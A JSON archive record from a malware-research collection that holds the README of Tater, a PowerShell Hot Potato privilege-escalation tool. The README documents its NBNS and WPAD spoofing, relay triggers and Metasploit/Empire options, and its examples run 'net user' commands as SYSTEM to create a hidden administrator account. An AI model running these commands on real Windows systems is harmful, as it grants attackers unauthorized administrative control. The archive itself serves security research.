{
    "id": "20ee08c1-91cc-4469-b416-3333e5492e4b",
    "created_at": "2023-01-12T15:06:42.374172Z",
    "updated_at": "2025-03-27T02:05:35.686979Z",
    "deleted_at": null,
    "sha1_hash": "ec5bd702d09d1d43d52077a2080fab27e9d715fb",
    "title": "2016-04-22 - Tater- A PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit.",
    "authors": "",
    "file_creation_date": "2022-05-28T18:23:56Z",
    "file_modification_date": "2022-05-28T18:23:56Z",
    "file_size": 343094,
    "plain_text": "# Tater\n\n**github.com/Kevin-Robertson/Tater**\n\nKevin-Robertson\n\nTater is a PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit.\n\n## Credit\n\nAll credit goes to @breenmachine, @foxglovesec, Google Project Zero, and anyone else\nthat helped work out the details for this exploit.\n\nPotato - [https://github.com/foxglovesec/Potato](https://github.com/foxglovesec/Potato)\n\n## Included In\n\n[p0wnedShell - https://github.com/Cn33liz/p0wnedShell](https://github.com/Cn33liz/p0wnedShell)\n[PowerShell Empire - https://github.com/PowerShellEmpire/Empire](https://github.com/PowerShellEmpire/Empire)\nPS>Attack - [https://github.com/jaredhaight/psattack](https://github.com/jaredhaight/psattack)\n\n## Functions\n\n### Invoke-Tater\n\nThe main Tater function.\n\nParameters\n\n\n-----\n\n**IP - Specify a specific local IP address. An IP address will be selected automatically if**\nthis parameter is not used.\n**SpooferIP - Specify an IP address for NBNS spoofing. This is needed when using two**\nhosts to get around an in-use port 80 on the privesc target.\n**Command - Command to execute as SYSTEM on the localhost. Use PowerShell**\ncharacter escapes where necessary.\n**NBNS - Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofing.**\n**NBNSLimit - Default = Enabled: (Y/N) Enable/Disable NBNS bruteforce spoofer**\nlimiting to stop NBNS spoofing while hostname is resolving correctly.\n**ExhaustUDP - Default = Disabled: (Y/N) Enable/Disable UDP port exhaustion to force**\nall DNS lookups to fail in order to fallback to NBNS resolution.\n**HTTPPort - Default = 80: Specify a TCP port for the HTTP listener and redirect**\nresponse.\n**Hostname - Default = WPAD: Hostname to spoof. WPAD.DOMAIN.TLD may be**\nrequired by Windows Server 2008.\n**WPADDirectHosts - Comma separated list of hosts to list as direct in the wpad.dat file.**\nNote that localhost is always listed as direct.\n**WPADPort - Default = 80: Specify a proxy server port to be included in the wpad.dat**\nfile.\n**Trigger - Default = 1: Trigger type to use in order to trigger HTTP to SMB relay. 0 =**\nNone, 1 = Windows Defender Signature Update, 2 = Windows 10 Webclient/Scheduled\nTask\n**TaskDelete - Default = Enabled: (Y/N) Enable/Disable scheduled task deletion for**\ntrigger 2. If enabled, a random string will be added to the taskname to avoid failures\nafter multiple trigger 2 runs.\n**Taskname - Default = Tater: Scheduled task name to use with trigger 2. If you observe**\nthat Tater does not work after multiple trigger 2 runs, try changing the taskname.\n**RunTime - Default = Unlimited: (Integer) Set the run time duration in minutes.**\n**ConsoleOutput - Default = Disabled: (Y/N) Enable/Disable real time console output. If**\nusing this option through a shell, test to ensure that it doesn't hang the shell.\n**StatusOutput - Default = Enabled: (Y/N) Enable/Disable startup messages.**\n**ShowHelp - Default = Enabled: (Y/N) Enable/Disable the help messages at startup.**\n**Tool - Default = 0: (0,1,2) Enable/Disable features for better operation through external**\ntools such as Metasploit's Interactive Powershell Sessions and Empire. 0 = None, 1 =\nMetasploit, 2 = Empire\n\n### Stop-Tater\n\nFunction to manually stop Invoke-Tater.\n\n### Usage\n\n\n-----\n\nTo import with Import-Module:\nImport-Module ./Tater.ps1\n\nTo import using dot source method:\n. ./Tater.ps1\n\n### Examples\n\nBasic trigger 1 example\n\nInvoke-Tater -Trigger 1 -Command \"net user tater Winter2016 /add && net localgroup\nadministrators tater /add\"\n\nBasic trigger 2 example\n\nInvoke-Tater -Trigger 2 -Command \"net user tater Winter2016 /add && net localgroup\nadministrators tater /add\"\n\nTwo system setup to get around port 80 being in-use on the privesc target\n\n**WPAD System - 192.168.10.100 - this system will just serve up a wpad.dat file that will**\ndirect HTTP traffic on the privesc target to the non-80 HTTP port\n\nInvoke-Tater -Trigger 0 -NBNS N -WPADPort 8080 -Command \"null\"\n\n**Privesc Target - 192.168.10.101**\n\nInvoke-Tater -Command \"net user Tater Winter2016 /add && net localgroup\nadministrators Tater /add\" -HTTPPort 8080 -SpooferIP 192.168.10.100\n\n### Screenshots\n\n\n-----\n\nWindows 7 using trigger 1 (NBNS WPAD Bruteforce + Windows Defender Signature\nUpdates)\n\n\n-----\n\nWindows 10 using trigger 2 (WebClient Service + Scheduled Task)\n\n\n-----\n\nWindows 7 using trigger 1 and UDP port exhaustion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2016/2016-04-22 - Tater- A PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit..pdf"
    ],
    "report_names": [
        "2016-04-22 - Tater- A PowerShell implementation of the Hot Potato Windows Privilege Escalation exploit..pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536002,
    "ts_updated_at": 1743041135,
    "ts_creation_date": 1653762236,
    "ts_modification_date": 1653762236,
    "files": {
        "pdf": "https://archive.orkl.eu/ec5bd702d09d1d43d52077a2080fab27e9d715fb.pdf",
        "text": "https://archive.orkl.eu/ec5bd702d09d1d43d52077a2080fab27e9d715fb.txt",
        "img": "https://archive.orkl.eu/ec5bd702d09d1d43d52077a2080fab27e9d715fb.jpg"
    }
}